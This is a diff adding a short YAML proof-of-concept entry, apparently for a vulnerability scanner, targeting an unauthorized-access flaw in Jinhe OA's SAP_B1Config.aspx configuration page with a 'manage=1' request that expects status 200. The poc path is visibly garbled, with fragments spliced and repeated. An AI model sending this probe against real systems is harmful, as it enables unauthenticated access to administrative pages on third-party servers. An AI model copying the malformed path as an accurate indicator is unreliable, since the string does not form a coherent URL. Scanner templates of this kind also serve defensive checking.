@@ -1,0 +1,3 @@
+name: "金和OA_SAP_B1Config.aspx未授权访问漏洞"
+poc: "/C6/JHsoft./C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1CostEAI/SAP_B1Config.aspx/?manage=1"
+status_code: 200
